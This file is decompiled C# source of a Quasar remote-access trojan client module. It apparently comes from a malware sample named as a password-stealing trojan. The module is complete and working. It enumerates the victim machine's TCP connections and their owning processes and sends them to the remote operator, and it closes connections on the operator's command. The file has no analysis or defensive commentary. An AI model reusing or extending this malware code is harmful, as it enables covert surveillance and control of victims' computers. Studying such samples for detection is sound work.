// Decompiled with JetBrains decompiler
// Type: Quasar.Client.Messages.TcpConnectionsHandler
// Assembly: Client, Version=1.4.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 73C3C7FC-0EA2-48C4-8CEF-33A8CFDA287C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-PSW.MSIL.Agent.anew-0b84e664c8b592aa0220d52841629b2accb41f1f624720331000ab5f2f0ed628.exe

using Quasar.Common.Enums;
using Quasar.Common.Messages;
using Quasar.Common.Models;
using Quasar.Common.Networking;
using System;
using System.Runtime.InteropServices;

namespace Quasar.Client.Messages
{
  public class TcpConnectionsHandler : IMessageProcessor
  {
    public bool CanExecute(IMessage message) => message is GetConnections || message is DoCloseConnection;

    public bool CanExecuteFrom(ISender sender) => true;

    public void Execute(ISender sender, IMessage message)
    {
      switch (message)
      {
        case GetConnections message1:
          this.Execute(sender, message1);
          break;
        case DoCloseConnection message2:
          this.Execute(sender, message2);
          break;
      }
    }

    private void Execute(ISender client, GetConnections message)
    {
      Quasar.Client.Utilities.NativeMethods.MibTcprowOwnerPid[] table = this.GetTable();
      TcpConnection[] tcpConnectionArray = new TcpConnection[table.Length];
      for (int index = 0; index < table.Length; ++index)
      {
        string str;
        try
        {
          str = System.Diagnostics.Process.GetProcessById((int) table[index].owningPid).ProcessName;
        }
        catch
        {
          str = string.Format("PID: {0}", (object) table[index].owningPid);
        }
        tcpConnectionArray[index] = new TcpConnection()
        {
          ProcessName = str,
          LocalAddress = table[index].LocalAddress.ToString(),
          LocalPort = table[index].LocalPort,
          RemoteAddress = table[index].RemoteAddress.ToString(),
          RemotePort = table[index].RemotePort,
          State = (ConnectionState) table[index].state
        };
      }
      client.Send<GetConnectionsResponse>(new GetConnectionsResponse()
      {
        Connections = tcpConnectionArray
      });
    }

    private void Execute(ISender client, DoCloseConnection message)
    {
      Quasar.Client.Utilities.NativeMethods.MibTcprowOwnerPid[] table = this.GetTable();
      for (int index = 0; index < table.Length; ++index)
      {
        if (message.LocalAddress == table[index].LocalAddress.ToString() && (int) message.LocalPort == (int) table[index].LocalPort && message.RemoteAddress == table[index].RemoteAddress.ToString() && (int) message.RemotePort == (int) table[index].RemotePort)
        {
          table[index].state = 12U;
          IntPtr num = Marshal.AllocCoTaskMem(Marshal.SizeOf<Quasar.Client.Utilities.NativeMethods.MibTcprowOwnerPid>(table[index]));
          Marshal.StructureToPtr<Quasar.Client.Utilities.NativeMethods.MibTcprowOwnerPid>(table[index], num, false);
          Quasar.Client.Utilities.NativeMethods.SetTcpEntry(num);
          this.Execute(client, new GetConnections());
          break;
        }
      }
    }

    private Quasar.Client.Utilities.NativeMethods.MibTcprowOwnerPid[] GetTable()
    {
      int ipVersion = 2;
      int dwOutBufLen = 0;
      int extendedTcpTable = (int) Quasar.Client.Utilities.NativeMethods.GetExtendedTcpTable(IntPtr.Zero, ref dwOutBufLen, true, ipVersion, Quasar.Client.Utilities.NativeMethods.TcpTableClass.TcpTableOwnerPidAll);
      IntPtr num = Marshal.AllocHGlobal(dwOutBufLen);
      Quasar.Client.Utilities.NativeMethods.MibTcprowOwnerPid[] table;
      try
      {
        if (Quasar.Client.Utilities.NativeMethods.GetExtendedTcpTable(num, ref dwOutBufLen, true, ipVersion, Quasar.Client.Utilities.NativeMethods.TcpTableClass.TcpTableOwnerPidAll) != 0U)
          return (Quasar.Client.Utilities.NativeMethods.MibTcprowOwnerPid[]) null;
        Quasar.Client.Utilities.NativeMethods.MibTcptableOwnerPid structure1 = (Quasar.Client.Utilities.NativeMethods.MibTcptableOwnerPid) Marshal.PtrToStructure(num, typeof (Quasar.Client.Utilities.NativeMethods.MibTcptableOwnerPid));
        IntPtr ptr = (IntPtr) ((long) num + (long) Marshal.SizeOf<uint>(structure1.dwNumEntries));
        table = new Quasar.Client.Utilities.NativeMethods.MibTcprowOwnerPid[(int) structure1.dwNumEntries];
        for (int index = 0; (long) index < (long) structure1.dwNumEntries; ++index)
        {
          Quasar.Client.Utilities.NativeMethods.MibTcprowOwnerPid structure2 = (Quasar.Client.Utilities.NativeMethods.MibTcprowOwnerPid) Marshal.PtrToStructure(ptr, typeof (Quasar.Client.Utilities.NativeMethods.MibTcprowOwnerPid));
          table[index] = structure2;
          ptr = (IntPtr) ((long) ptr + (long) Marshal.SizeOf<Quasar.Client.Utilities.NativeMethods.MibTcprowOwnerPid>(structure2));
        }
      }
      finally
      {
        Marshal.FreeHGlobal(num);
      }
      return table;
    }
  }
}
